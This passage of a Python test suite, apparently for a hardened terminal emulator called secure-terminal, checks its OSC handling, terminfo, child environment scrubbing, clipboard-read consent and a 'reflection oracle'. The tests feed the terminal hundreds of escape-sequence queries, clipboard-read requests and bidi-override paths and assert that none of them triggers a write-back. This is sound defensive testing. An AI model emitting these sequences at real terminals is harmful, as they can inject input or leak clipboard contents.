_oh = SecureTerminal(command='/bin/cat', tui=True)
_oh.apply_osc('osc_hyperlink', True)
_oh.apply_osc('osc_notify', True)
_links = []
_oh.notified.connect(lambda s: _links.append(s))
# OSC 8 hyperlink with an ST (ESC \) terminator, not just BEL, must be surfaced
_oh._handle_osc(b'\x1b]8;;https://example.com/a\x1b\\click\x1b]8;;\x1b\\')
ok(any('https://example.com/a' in s for s in _links),
   'OSC 8 hyperlink with an ST terminator is surfaced')
# an OSC split across two reads (a 64KiB clipboard is guaranteed to) is still acted on
_links.clear()
_oh._handle_osc(b'\x1b]9;hello ')                 # incomplete -> held as carry
_oh._handle_osc(b'world\x07')                     # completes it on the next read
ok(any('hello world' in s for s in _links), 'an OSC split across PTY reads is still acted on')
_oh.close()

# OSC 7 cwd: a percent-encoded bidi/zero-width char is sanitized before the tooltip
_o7 = SecureTerminal(command='/bin/cat', tui=True)
_o7.apply_osc('osc_cwd', True)
_paths = []
_o7.cwd_changed.connect(lambda p: _paths.append(p))
_o7._handle_osc(b'\x1b]7;file://host/home/%E2%80%AE/x\x07')     # %E2%80%AE = U+202E RLO
_rlo = chr(0x202E)                                # bidi override, kept out of source
ok(_paths and all(_rlo not in p for p in _paths),
   'OSC 7 percent-decoded path is sanitized (no bidi override reaches the tooltip)')
_o7.close()

# restored history is capped so entering TUI cannot synchronously replay a huge scrollback
_big = SecureTerminal(command='/bin/cat', history='x' * 2_000_000)
ok(len(_big._raw) <= _big._RAW_MAX, 'restored history is capped to _RAW_MAX')
_big.close()

# an alternate-screen flood is bounded (per-read snapshot cap), does not hang
if tui_available():
    _af = SecureTerminal(command='/bin/cat', tui=True)
    _af._make_screen()
    _af._feed_stream(b'\x1b[?1049h\x1b[?1049l' * 1000)         # 2000 transitions
    ok(True, 'an alternate-screen flood returns (bounded) rather than hanging')
    _af.close()

# a legacy allow_title lock also locks the granular title/notify controls
_saved_l = win._locked
win._locked = set(win._locked) | {'allow_title'}
win._osc_defaults['osc_notify'] = False
win.set_osc('osc_notify', True)
ok(not win._osc_defaults['osc_notify'],
   'a legacy allow_title lock refuses granular title/notify edits')
win._locked = _saved_l

# session dump carries the full per-tab OSC map, not just the allow_title boolean
_stabs = win._session_tabs()
ok(_stabs and isinstance(_stabs[0].get('osc'), dict) and 'osc_clipboard' in _stabs[0]['osc'],
   'session persists the full per-tab OSC feature map')

# an explicit granular osc_notify=false survives a restart even with legacy
# allow_title=true present (the fallback must not clobber an explicit value)
_cfgdir = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgdir, exist_ok=True)
_ucfg = os.path.join(_cfgdir, '50_user.conf')
with open(_ucfg, 'w', encoding='utf-8') as _fh:
    _fh.write('allow_title=true\nosc_title=true\nosc_notify=false\n')
_wd = MainWindow()
ok(_wd._osc_defaults['osc_title'] and not _wd._osc_defaults['osc_notify'],
   'legacy allow_title does not override an explicit granular osc_notify=false')
_wd.close()
os.remove(_ucfg)                                  # restore the empty test config

# --- opt-in restricted CLI terminfo -------------------------------------------
import secure_terminal.terminal as _timod                          # noqa: E402
_tdir = _timod.cli_terminfo_dir()
ok(_tdir and os.path.isfile(os.path.join(_tdir, 's', 'secure-terminal')),
   'the restricted terminfo entry compiles/resolves')
# TERM is per-MODE: CLI advertises the restricted secure-terminal entry (so a
# program lists completions plainly and never draws an in-place menu line mode
# cannot show); TUI advertises xterm-256color (full caps for full-screen apps +
# ssh). The dir is returned in BOTH modes so TERMINFO_DIRS resolves either entry
# across a live switch (apply_tui re-exports TERM without restarting the shell).
_ttc = SecureTerminal(command='/bin/cat')                  # CLI mode (default)
eq(_ttc._child_term(), ('secure-terminal', _tdir),
   'CLI mode advertises the restricted TERM (no completion-menu redraws)')
_ttc.close()
_ttt = SecureTerminal(command='/bin/cat', tui=True)        # TUI mode
_term, _d = _ttt._child_term()
eq(_term, 'xterm-256color', 'TUI mode advertises xterm-256color (full caps)')
ok(_d == _tdir, 'TERMINFO_DIRS resolves the restricted entry in both modes')
_ttt.close()
# the entry cancels every capability-query cap (no probing) + cursor-addressing +
# alternate screen -- assert at the source of truth (the .ti)
_ti = _timod._terminfo_source()
ok(_ti and os.path.isfile(_ti), 'the terminfo source ships')
with open(_ti, encoding='utf-8') as _tih:
    _ti_txt = _tih.read()
ok(all(cap in _ti_txt for cap in ('u6@', 'u7@', 'u8@', 'u9@', 'RV@',
                                  'cup@', 'smcup@', 'rmcup@', 'clear@')),
   'the entry cancels the query + cursor-addressing + alt-screen caps')
# end-to-end: a CLI-mode child actually sees TERM=secure-terminal
_te = SecureTerminal(command=['sh', '-c', 'printf T=$TERM'])
_ebuf = b''
_estart = _time.monotonic()
import fcntl as _fcntl2                                             # noqa: E402
_fcntl2.fcntl(_te._fd, _fcntl2.F_SETFL,
              _fcntl2.fcntl(_te._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
while _time.monotonic() - _estart < 1.5:
    import select as _sel2
    _r, _, _ = _sel2.select([_te._fd], [], [], 0.05)
    if _te._fd in _r:
        try:
            _chunk = os.read(_te._fd, 4096)
        except OSError:
            break
        if not _chunk:
            break
        _ebuf += _chunk
        if b'T=' in _ebuf:
            break
_te.close()
ok(b'T=secure-terminal' in _ebuf, 'the child process actually gets TERM=secure-terminal')

# CLI<->TUI toggle re-exports TERM for the new mode into the RUNNING shell (no
# restart, state preserved), and is REFUSED with an advisory while a program owns
# the terminal -- its terminfo cannot be changed under it (#63). command=None: the
# re-export only fires for the DEFAULT login shell, so this needs a shell tab.
_tg = SecureTerminal(command=None)
_tgadv = []
_tg.advise_signal.connect(_tgadv.append)
_tgsent = spy_writes(_tg)
_tg.has_foreground_program = lambda: True             # a program is running
ok(_tg.apply_tui(True) is False and _tg._tui is False,
   'apply_tui is refused while a program is running')
ok(any('shell prompt' in a for a in _tgadv),
   'the refusal advises switching at a shell prompt')
ok(_tgsent == [], 'a refused switch writes nothing to the shell')
_tg.has_foreground_program = lambda: False            # at a prompt now
ok(_tg.apply_tui(True) is True and _tg._tui is True,
   'apply_tui switches to TUI at a shell prompt')
# CR (\r), not \n: zsh's zle binds accept-line to CR, so \n would leave the
# re-export unsubmitted at the prompt (regression: TUI->CLI "not auto sent").
ok(b'export TERM=xterm-256color\r' in _tgsent,
   'CLI->TUI re-exports the full terminfo to the running shell, CR-terminated')
ok(not any(b'export TERM=xterm-256color\n' in s for s in _tgsent),
   'the re-export is NOT \\n-terminated (would not submit under zle)')
_tgsent.clear()
_tg.apply_tui(False)
ok(b'export TERM=secure-terminal\r' in _tgsent,
   'TUI->CLI re-exports the restricted terminfo to the running shell, CR-terminated')
_tg.close()

# A tab launched with `-- PROGRAM` runs that program as _pid, which
# has_foreground_program cannot tell from a bare shell, so the re-export is SKIPPED
# there -- else `export TERM=...` would be typed into the program (ai-review P1).
_tgc = SecureTerminal(command='/bin/cat')
_tgcsent = spy_writes(_tgc)
_tgc.has_foreground_program = lambda: False            # looks like "a prompt"
ok(_tgc.apply_tui(True) is True and _tgc._tui is True,
   'apply_tui still switches mode for a command tab')
ok(not any(b'export TERM=' in s for s in _tgcsent),
   'a command tab (command != None) never re-exports TERM into the program')
_tgc.close()

# apply_tui reports failure when TUI is requested but pyte is unavailable, so a
# caller cannot persist/checkmark a mode that was never applied (ai-review).
_tgu = SecureTerminal(command='/bin/cat')
_o_avail = _timod.tui_available
try:
    _timod.tui_available = lambda: False
    ok(_tgu.apply_tui(True) is False and _tgu._tui is False,
       'apply_tui returns False (not applied) when pyte is unavailable')
finally:
    _timod.tui_available = _o_avail
_tgu.close()

# #93: has_foreground_program / terminate distinguish a LOGIN shell's bare prompt
# (its child IS the shell -> nothing to terminate) from a `-- PROGRAM` tab (its
# child IS the program -- nano, htop -- to terminate). Force "the child is in the
# foreground" (fg pgrp == _pid) and flip _command to read it both ways, so one
# lightweight tab exercises all four branches deterministically.
import os as _os93                                       # noqa: E402
_fgt = SecureTerminal(command='/bin/cat')                # command tab: _command set
# pty.fork() runs the child's setsid() asynchronously; until it completes the
# child briefly shares OUR process group, which terminate's self-kill guard
# (correctly) refuses to signal. A real user never terminates in that microsecond
# window -- wait for the child to settle into its own session before probing.
for _ in range(200):
    try:
        if _os93.getpgid(_fgt._pid) != _os93.getpgrp():
            break
    except OSError:
        break
    pump(10)
_fgt._foreground_pgrp = lambda: _os93.getpgid(_fgt._pid)
ok(_fgt.has_foreground_program(),
   '#93: a `-- PROGRAM` tab whose program is in the foreground is terminable')
_fgt._command = None                                     # read as a login shell at its prompt
ok(not _fgt.has_foreground_program(),
   '#93: a login shell at its bare prompt is not terminable')
ok(not _fgt.terminate_foreground(),
   '#93: terminate is a no-op at a login-shell bare prompt')
_fgt._command = '/bin/cat'                               # a command tab again
ok(_fgt.terminate_foreground(), '#93: terminate acts on a command-tab program')
_fgt.close()

# #93 (ai-review F5): getpgid races the child's death -- if the child exits between
# the enable-poll and the click, terminate_foreground must treat it as gone (no-op),
# not raise ProcessLookupError out of the slot (as has_foreground_program does).
_ogpg93 = _os93.getpgid
_os93.getpgid = lambda _p: (_ for _ in ()).throw(ProcessLookupError())
try:
    _fgd = SecureTerminal(command='/bin/cat')
    _fgd._command = None
    _fgd._pid = 999999
    _fgd._foreground_pgrp = lambda: 424242          # non-None, not our own group
    ok(not _fgd.terminate_foreground(),
       '#93: terminate is a no-op when getpgid races the child death (no exception)')
    _fgd.close()
finally:
    _os93.getpgid = _ogpg93

# --- truecolour / 256-colour rendering (CLI line mode) ------------------------
_tc = SecureTerminal(command='/bin/cat')
eq(_tc._format_for({'fg': '#ff6400', 'bg': None, 'bold': False}).foreground().color().name(),
   '#ff6400', 'CLI renders a 24-bit truecolour fg')
ok(_tc._format_for({'fg': 3, 'bg': None, 'bold': False}).foreground().color().isValid(),
   'CLI still renders a 16-colour palette fg')
ok(_tc._format_for({'fg': '#123456', 'bg': '#123456', 'bold': False})
   .foreground().color().name() != '#123456',
   'the contrast guard forces a readable fg even when a truecolour fg == bg')
_tc.close()
# a child sees COLORTERM=truecolor (we render it faithfully, so we advertise it)
_cte = SecureTerminal(command=['sh', '-c', 'printf C=$COLORTERM,CTEND'])
_cbuf = b''
_cs = _time.monotonic()
_fcntl2.fcntl(_cte._fd, _fcntl2.F_SETFL,
              _fcntl2.fcntl(_cte._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
while _time.monotonic() - _cs < 1.5:
    import select as _sel3
    _rr, _, _ = _sel3.select([_cte._fd], [], [], 0.05)
    if _cte._fd in _rr:
        try:
            _ck = os.read(_cte._fd, 4096)
        except OSError:
            break
        if not _ck:
            break
        _cbuf += _ck
        if b'CTEND' in _cbuf:              # distinct terminator, not the C= prefix
            break
_cte.close()
ok(b'C=truecolor' in _cbuf, 'the child gets COLORTERM=truecolor')


# --- child environment scrub (fingerprint vars, LINES/COLUMNS, PAGER default) --
def _child_env_out(cmd, needle, secs=1.5):
    """Spawn a CLI child running `cmd`, read its raw output until `needle` (bytes)
    or `secs` elapse, return the bytes -- asserts what the child actually inherits."""
    import select as _selce
    _t = SecureTerminal(command=cmd)
    _fcntl2.fcntl(_t._fd, _fcntl2.F_SETFL,
                  _fcntl2.fcntl(_t._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
    _b = b''
    _s = _time.monotonic()
    while _time.monotonic() - _s < secs:
        _rr, _, _ = _selce.select([_t._fd], [], [], 0.05)
        if _t._fd in _rr:
            try:
                _c = os.read(_t._fd, 4096)
            except OSError:
                break
            if not _c:
                break
            _b += _c
            if needle in _b:
                break
    _t.close()
    return _b


# preload every fingerprint var terminal.py drops + a stale LINES/COLUMNS, so any
# leak is visible in the child's `env`
_fp_vars = ('TERM_PROGRAM', 'TERM_PROGRAM_VERSION', 'VTE_VERSION',
            'KONSOLE_VERSION', 'KONSOLE_DBUS_SERVICE', 'KONSOLE_DBUS_SESSION',
            'WT_SESSION', 'WT_PROFILE_ID', 'ITERM_SESSION_ID', 'ITERM_PROFILE',
            'KITTY_WINDOW_ID', 'KITTY_PID', 'ALACRITTY_WINDOW_ID')
for _fv in _fp_vars:
    os.environ[_fv] = 'leak-' + _fv
os.environ['LINES'] = '99'
os.environ['COLUMNS'] = '222'
# leading newline so a first-line var is matched by the "\nNAME=" test too
_envout = b'\n' + _child_env_out(['sh', '-c', 'env; printf ENVEND'], b'ENVEND')
for _fv in _fp_vars:
    ok(('\n' + _fv + '=').encode() not in _envout,
       'child does not inherit fingerprint var ' + _fv)
ok(b'\nLINES=' not in _envout,
   'child does not inherit a stale LINES (real size comes from TIOCSWINSZ)')
ok(b'\nCOLUMNS=' not in _envout, 'child does not inherit a stale COLUMNS')
for _fv in _fp_vars + ('LINES', 'COLUMNS'):
    os.environ.pop(_fv, None)
# PAGER defaults to cat when the parent set none; a distinct terminator (not the
# P= prefix of the expected value) so a split read cannot break the loop early
os.environ.pop('PAGER', None)
_pgr = _child_env_out(['sh', '-c', 'printf P=$PAGER,PGREND'], b'PGREND')
ok(b'P=cat,' in _pgr, 'the child gets PAGER=cat by default')

# --- synchronized output (DECSET 2026): hold the paint between begin/end ------
_sy = SecureTerminal(command='/bin/cat', tui=True)
_sy._make_screen()
_sy._render_timer.stop()
feed_output(_sy, b'\x1b[?2026h')
ok(_sy._sync_update and not _sy._render_timer.isActive(),
   'DECSET 2026 begin holds the paint (pyte still fed)')
feed_output(_sy, b'half a frame')
ok(_sy._sync_update and not _sy._render_timer.isActive(),
   'the paint stays held during a synchronized update')
feed_output(_sy, b'\x1b[?2026l')
ok(not _sy._sync_update, 'DECSET 2026 end releases the hold')
feed_output(_sy, b'\x1b[?2026h')
_sy._end_sync_update()                     # simulate the watchdog firing
ok(not _sy._sync_update, 'an unclosed synchronized update is bounded (watchdog)')
_sy.close()

# a pending 16ms paint is cancelled when a synchronized update begins (no partial)
_sy2 = SecureTerminal(command='/bin/cat', tui=True)
_sy2._make_screen()
_sy2._render_timer.start(16)               # arm a pending paint
feed_output(_sy2, b'\x1b[?2026h')
ok(_sy2._sync_update and not _sy2._render_timer.isActive(),
   'entering a synchronized update cancels a pending partial paint')
# a ?2026 marker split across two reads is still detected (boundary carry)
_sy2._end_sync_update()
feed_output(_sy2, b'\x1b[?202')            # first half of the begin marker
feed_output(_sy2, b'6h')                   # second half in the next read
ok(_sy2._sync_update, 'a ?2026h begin split across reads is still detected')
feed_output(_sy2, b'\x1b[?2026l')
ok(not _sy2._sync_update, 'and the matching end too')
# a repeated begin while already held must NOT re-arm the watchdog (no indefinite hold)
_starts = []
_sy2._sync_timer.start = lambda *a: _starts.append(1)   # count re-arms
feed_output(_sy2, b'\x1b[?2026h')          # enter -> arm once
feed_output(_sy2, b'\x1b[?2026h')          # repeat while held -> must not re-arm
eq(len(_starts), 1, 'a repeated ?2026h while held does not re-arm the watchdog')
# but an END-then-BEGIN in one read is a NEW frame -> the watchdog IS restarted
feed_output(_sy2, b'\x1b[?2026l\x1b[?2026h')
eq(len(_starts), 2, 'an end-then-begin in one read restarts the watchdog (new frame)')
_sy2.close()

# NOTE: the gated OSC colour-query write-back was REMOVED. No terminal-side signal
# (alt-screen, ICANON) reliably distinguishes a legit query consumer from injection
# at a shell prompt -- a background job or a cat'd file emitting ?1049h defeats the
# gate. The absolute "output never writes to the pty" closure is kept instead;
# every query, colour included, stays unanswered (see the reflection oracle below).

# --- OSC 52 clipboard READ: opt-in, ask-once-per-tab, the ONE write-back -------
from PyQt6.QtGui import QGuiApplication as _QGA                     # noqa: E402
_QGA.clipboard().setText('clip-secret')


def _clip_read(feature_on, grant):
    c = SecureTerminal(command='/bin/cat', tui=True)
    c.apply_osc('osc_clipboard_read', feature_on)
    _reqs = []
    c.clipboard_read_requested.connect(lambda: _reqs.append(1))
    _sent = []
    c._write = _sent.append                # pylint: disable=protected-access
    if grant is not None:
        c.grant_clipboard_read(grant)
    c._handle_osc(b'\x1b]52;c;?\x07')
    c.close()
    return _reqs, _sent


_rq, _st = _clip_read(False, None)
eq(_st, [], 'OSC 52 read: feature off -> no reply')
eq(len(_rq), 0, 'OSC 52 read: feature off -> no dialog asked')
_rq, _st = _clip_read(True, None)
eq(_st, [], 'OSC 52 read: enabled but tab undecided -> NO reply (only asks once)')
eq(len(_rq), 1, 'OSC 52 read: enabled + undecided -> the ask-once-per-tab dialog is raised')
_rq, _st = _clip_read(True, False)
eq(_st, [], 'OSC 52 read: tab denied -> no reply, no re-ask')
eq(len(_rq), 0, 'OSC 52 read: a denied tab is not re-asked')
_rq, _st = _clip_read(True, True)
ok(len(_st) == 1 and _st[0].startswith(b'\x1b]52;c;'),
   'OSC 52 read: enabled + tab granted -> the clipboard is answered')
import base64 as _b64                                              # noqa: E402
eq(_b64.b64decode(_st[0].split(b';', 2)[2].rstrip(b'\x07')), b'clip-secret',
   'OSC 52 read: the reply carries the clipboard, base64-encoded')
# rate-limited: a granted tab cannot be flood-exfiltrated
_cg = SecureTerminal(command='/bin/cat', tui=True)
_cg.apply_osc('osc_clipboard_read', True)
_cg.grant_clipboard_read(True)
_cgs = []
_cg._write = _cgs.append
_cg._handle_osc(b'\x1b]52;c;?\x07')
_cg._handle_osc(b'\x1b]52;c;?\x07')
eq(len(_cgs), 1, 'OSC 52 read: two reads in a granted tab -> one reply (rate-limited)')
_cg.close()
# granting a PENDING request answers the query that opened the dialog (codex F1)
_cp = SecureTerminal(command='/bin/cat', tui=True)
_cp.apply_osc('osc_clipboard_read', True)
_cps = []
_cp._write = _cps.append
_cp._handle_osc(b'\x1b]52;c;?\x07')        # -> pending, dialog asked, no reply yet
eq(_cps, [], 'a pending clipboard request sends no reply until the user decides')
_cp.grant_clipboard_read(True)             # user allows -> the pending query is answered NOW
ok(len(_cps) == 1 and _cps[0].startswith(b'\x1b]52;c;'),
   'granting a pending request answers the query that opened the dialog')
_cp.close()

# --- OSC 52 read: the four dialog decisions (allow/deny x once/always) ---------
def _clip_term():
    c = SecureTerminal(command='/bin/cat', tui=True)
    c.apply_osc('osc_clipboard_read', True)
    reqs, sent = [], []
    c.clipboard_read_requested.connect(lambda: reqs.append(1))
    c._write = sent.append                 # pylint: disable=protected-access
    return c, reqs, sent


def _clip_ask(c):
    c._last_clip_read = 0.0                 # clear the rate-limit gate for the test
    c._handle_osc(b'\x1b]52;c;?\x07')

# allow-once: answers THIS request, but does NOT remember -> the next read re-asks
_co, _cor, _cos = _clip_term()
_clip_ask(_co)
_co.grant_clipboard_read(_co.CLIP_ALLOW_ONCE)
eq(len(_cos), 1, 'OSC 52 read: allow-once answers the pending request')
_clip_ask(_co)
eq(len(_cor), 2, 'OSC 52 read: allow-once does not remember -> the next read re-asks')
_co.close()

# allow-always: answers and remembers -> the next read replies with no new dialog
_ca, _car, _cas = _clip_term()
_clip_ask(_ca)
_ca.grant_clipboard_read(_ca.CLIP_ALLOW_ALWAYS)
_clip_ask(_ca)
eq(len(_car), 1, 'OSC 52 read: allow-always is remembered -> no second dialog')
eq(len(_cas), 2, 'OSC 52 read: allow-always answers subsequent reads directly')
_ca.close()

# deny-once: no reply, and the next read re-asks
_do, _dor, _dos = _clip_term()
_clip_ask(_do)
_do.grant_clipboard_read(_do.CLIP_DENY_ONCE)
eq(_dos, [], 'OSC 52 read: deny-once sends no reply')
_clip_ask(_do)
eq(len(_dor), 2, 'OSC 52 read: deny-once does not remember -> the next read re-asks')
_do.close()

# deny-always: no reply, no re-ask
_da, _dar, _das = _clip_term()
_clip_ask(_da)
_da.grant_clipboard_read(_da.CLIP_DENY_ALWAYS)
_clip_ask(_da)
eq(_das, [], 'OSC 52 read: deny-always sends no reply')
eq(len(_dar), 1, 'OSC 52 read: deny-always is remembered -> no re-ask')
_da.close()

# global always-allow: an undecided tab auto-answers with NO dialog...
_ga, _gar, _gas = _clip_term()
_ga.set_clipboard_read_always(True)
_clip_ask(_ga)
eq(len(_gar), 0, 'OSC 52 read: global always-allow answers WITHOUT a dialog')
ok(len(_gas) == 1 and _gas[0].startswith(b'\x1b]52;c;'),
   'OSC 52 read: global always-allow replies to an undecided tab')
# ...but an explicit per-tab Deny still wins over the global default
_ga.grant_clipboard_read(_ga.CLIP_DENY_ALWAYS)
_gas.clear()
_clip_ask(_ga)
eq(_gas, [], 'OSC 52 read: a per-tab Deny wins over global always-allow')
_ga.close()
# CLI-mode notice distinguishes an OSC 52 READ query from a WRITE (shared code 52)
_cn = SecureTerminal(command='/bin/cat')   # CLI mode
_nk = []
_cn.osc_used.connect(lambda k: _nk.append(k))
feed_output(_cn, b'\x1b]52;c;?\x07')       # read query
ok('osc_clipboard_read' in _nk, 'CLI OSC 52 read query is notified as clipboard_read')
_nk.clear()
feed_output(_cn, b'\x1b]52;c;aGk=\x07')    # write
ok('osc_clipboard' in _nk and 'osc_clipboard_read' not in _nk,
   'CLI OSC 52 write is notified as clipboard (write), not read')
_cn.close()

# --- reflection oracle: output must NEVER cause a write to the pty ------------
# The crown-jewel invariant. A crafted file cat'd to the terminal, or hostile
# program output, can emit a capability QUERY (DA/DSR/CPR/XTVERSION/DECRQM/
# XTGETTCAP/DECRQSS/kitty-?u/OSC color+clipboard read/ENQ). A terminal that
# ANSWERS reflects the reply into the foreground program's stdin -- a 20-year
# "output becomes input" injection class. secure-terminal answers NONE of them,
# in either mode, because nothing on the output path writes to the pty. Feed the
# whole battery through the real _on_readable and assert the write-spy stays empty.
def _spec_surface_corpus():
    """The reflection/query spec surface expanded to its real breadth: every
    DISTINCT sequence a terminal could be asked to REPLY to (each a documented
    query, not padding). Covers DA1/DA2/DA3 + DECID, DSR (ANSI + DEC-private),
    DECRQM for the documented ANSI and DEC-private modes, OSC dynamic-colour
    queries for all 256 palette indices + the special colour slots, OSC 52
    clipboard READ per selection, XTGETTCAP for the standard terminfo cap set,
    DECRQSS status-string requests, XTWINOPS report requests, XTVERSION, the kitty
    keyboard query and ENQ. secure-terminal answers NONE of them in either mode."""
    seq = []
    seq += [b'\x1b[c', b'\x1b[0c', b'\x1b[>c', b'\x1b[>0c', b'\x1b[=c',
            b'\x1b[=0c', b'\x1bZ']              # DA1/DA2/DA3 + DECID
    for _n in (5, 6, 15, 25, 26, 53, 55, 56, 62, 63, 75, 85):
        seq.append(b'\x1b[%dn' % _n)           # DSR (ANSI)
        seq.append(b'\x1b[?%dn' % _n)          # DSR (DEC-private)
    for _m in (2, 4, 12, 20):
        seq.append(b'\x1b[%d$p' % _m)          # DECRQM (ANSI modes)
    for _m in (1, 3, 5, 6, 7, 8, 9, 12, 25, 45, 47, 66, 67, 69, 1000, 1001,
               1002, 1003, 1004, 1005, 1006, 1007, 1015, 1016, 1034, 1047,
               1048, 1049, 2004, 2026, 2027, 2031, 9001):
        seq.append(b'\x1b[?%d$p' % _m)         # DECRQM (DEC-private modes)
    for _n in range(256):
        seq.append(b'\x1b]4;%d;?\x07' % _n)    # OSC 4 palette query, every index
    for _n in range(10, 20):
        seq.append(b'\x1b]%d;?\x07' % _n)      # OSC 10-19 special colour slots
    for _sel in (b'c', b'p', b's', b'0', b'7'):
        seq.append(b'\x1b]52;' + _sel + b';?\x07')   # OSC 52 clipboard READ
    for _cap in ('Co', 'RGB', 'TN', 'name', 'bce', 'colors', 'cr', 'kbs', 'kDC',
                 'kEND', 'kHOM', 'kLFT', 'kNXT', 'kPRV', 'kRIT', 'khome', 'kend',
                 'smcup', 'rmcup', 'smkx', 'rmkx', 'Se', 'Ss', 'Cr', 'Cs', 'u6',
                 'u7', 'u8', 'u9'):
        seq.append(b'\x1bP+q' + _cap.encode().hex().encode() + b'\x1b\\')  # XTGETTCAP
    for _s in (b'm', b'r', b's', b'"q', b'"p', b' q', b't', b'$}', b'$~'):
        seq.append(b'\x1bP$q' + _s + b'\x1b\\')      # DECRQSS status-string request
    for _t in (11, 13, 14, 18, 19, 20, 21):
        seq.append(b'\x1b[%dt' % _t)           # XTWINOPS size/position/title reports
    seq += [b'\x1b[>q', b'\x1b[?u', b'\x05']    # XTVERSION, kitty query, ENQ
    return list(dict.fromkeys(seq))            # distinct, order-preserving


_QUERIES = _spec_surface_corpus()


for _label, _mk in (('CLI', lambda: SecureTerminal(command='/bin/cat')),
                    ('TUI', lambda: SecureTerminal(command='/bin/cat', tui=True))):
    _ro = _mk()
    if _label == 'TUI':
        for _k in (f[0] for f in _S.OSC_FEATURES):
            _ro.apply_osc(_k, True)        # even every OSC feature ENABLED must not reply
    _rosent = spy_writes(_ro)
    for _q in _QUERIES:
        feed_output(_ro, _q)
    ok(_rosent == [],
       'reflection oracle (%s): none of the %d spec-surface queries is answered '
       'back to the pty (got %r)' % (_label, len(_QUERIES), _rosent))
    if _label == 'CLI':
        ok(_ro._screen is None,           # pylint: disable=protected-access
           'reflection oracle (CLI): the pyte screen is never instantiated '
           '(no VT state to attack)')
    # Even if pyte itself tried to reply, our screen never wires the channel:
    if _ro._screen is not None:            # pylint: disable=protected-access
        _ro._screen.write_process_input('should-go-nowhere')
        ok(_rosent == [], 'reflection oracle (%s): pyte write_process_input reaches no pty'
           % _label)
    _ro.close()

# lock the corpus size so the "N spec-surface sequences" figure on the site and the
# test cannot silently drift apart (compatibility + ai-review pages cite this count)
ok(len(_QUERIES) == 387,
   'the reflection spec-surface corpus is 387 distinct query sequences (got %d)'
   % len(_QUERIES))

# --- graphics payloads (sixel DCS, kitty APC, iTerm2 1337): stripped, no reply -
# a cat'd image is a huge DCS/APC/OSC string; CLI shows no image and answers nothing
_gfx = SecureTerminal(command='/bin/cat')
_gfxsent = spy_writes(_gfx)
feed_output(_gfx, b'before\x1bP0;0;0q#0;2;0;0;0#0~~@@vv@@~~$-#1?}}GG}}?-\x1b\\after\n')
feed_output(_gfx, b'k\x1b_Gf=32,s=1,v=1,c=1,r=1;AAAA\x1b\\g\n')   # kitty graphics
feed_output(_gfx, b'i\x1b]1337;File=inline=1:AAAA\x07j\n')        # iTerm2 inline image
_gfxdoc = _gfx.toPlainText()
ok('\x1b' not in _gfxdoc, 'graphics payloads leave no escape byte in the document')
ok('before' in _gfxdoc and 'after' in _gfxdoc,
   'text around a sixel image survives; the image DCS body is dropped')
ok('#0;2' not in _gfxdoc and 'Gf=32' not in _gfxdoc and 'File=inline' not in _gfxdoc,
   'no sixel/kitty/iTerm2 image data is rendered as text')
ok(_gfxsent == [], 'a graphics payload triggers no reply to the pty')
_gfx.close()

# --- mouse + focus reporting is never forwarded to the pty --------------------
# even with a program requesting mouse (1000/1006) and focus (1004) reporting, a
# click or focus change writes no escape to the child: mouse stays a local
# selection function and focus is not a reportable event (compatibility page).
from PyQt6.QtGui import QFocusEvent as _QFE            # noqa: E402
_mf = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_mf, b'\x1b[?1000h\x1b[?1006h\x1b[?1004h')   # request mouse + focus reports
_mfsent = spy_writes(_mf)
_mflb = Qt.MouseButton.LeftButton
_mfpress = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(9, 9), QPointF(9, 9),
                       _mflb, _mflb, Qt.KeyboardModifier.NoModifier)
_mfrel = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(9, 9), QPointF(9, 9),
                     _mflb, Qt.MouseButton.NoButton, Qt.KeyboardModifier.NoModifier)
_mf.mousePressEvent(_mfpress)
_mf.mouseReleaseEvent(_mfrel)
_mf.focusInEvent(_QFE(QEvent.Type.FocusIn))
_mf.focusOutEvent(_QFE(QEvent.Type.FocusOut))
ok(_mfsent == [],
   'mouse/focus events write no report escape to the pty (got %r)' % _mfsent)
_mf.close()

# ADVERSARIAL reflection oracle: a hostile file/program does not just emit a
# query -- it can ALSO emit output that tries to OPEN a reply first (fake the
# alternate screen with ESC[?1049h, begin a synchronized update), and the shell
# may be at a readline prompt (pty non-canonical, ICANON off). NONE of these
# output-induced states, alone or combined, may open ANY write-back. This is the
# property that would have caught the alt-screen and raw-mode gate defeats before
# external review: feed every query PREFIXED with each state-faking sequence and
# assert the write-spy stays empty.
import termios as _tio_adv                                         # noqa: E402
_ADV_PREFIXES = [b'', b'\x1b[?1049h', b'\x1b[?1047h', b'\x1b[?47h', b'\x1b[?2026h',
                 b'\x1b[?1049h\x1b[?2026h']
_adv = SecureTerminal(command='/bin/cat', tui=True)
for _k in (f[0] for f in _S.OSC_FEATURES):
    _adv.apply_osc(_k, True)               # every OSC feature enabled
_aa = _tio_adv.tcgetattr(_adv._fd)         # + the readline-prompt case (ICANON off)
_aa[3] &= ~_tio_adv.ICANON
_tio_adv.tcsetattr(_adv._fd, _tio_adv.TCSANOW, _aa)
_advsent = spy_writes(_adv)
for _pfx in _ADV_PREFIXES:
    for _q in _QUERIES:
        feed_output(_adv, _pfx + _q)
ok(_advsent == [],
   'reflection oracle (adversarial): output that fakes alt-screen / sync while at '
   'a readline prompt still elicits ZERO write-back (got %r)' % _advsent[:3])
_adv.close()

# --- bell (BEL) policy --------------------------------------------------------
# A standalone BEL in output rings per the tab's policy (off/audible/visual),
# off by default (BEL from untrusted output is a nuisance surface), and is
# rate-limited so a BEL flood cannot machine-gun it. An OSC-terminating BEL is
# not a bell. The BEL itself stays neutralized in the display either way.
import secure_terminal.terminal as _stmod    # noqa: E402


class _FakeApp:
    def __init__(self):
        self.beeps = 0
        self.alerts = 0

    def beep(self):
        self.beeps += 1

    def alert(self, _win, _msec):
        self.alerts += 1


class _QAppShim:
    _fake = _FakeApp()

    @staticmethod
    def instance():
        return _QAppShim._fake


_be = SecureTerminal(command='/bin/cat')
eq(_be.bell_channels(), set(), 'bell defaults to silent (no channels)')
_be.apply_bell('audible')
eq(_be.bell_channels(), {'audible'}, 'apply_bell enables a channel')
_be.apply_bell('audible,visual,tray')
eq(_be.bell_channels(), {'audible', 'visual', 'tray'}, 'channels are non-exclusive')
_be.apply_bell({'visual'})                         # a set spec is accepted too
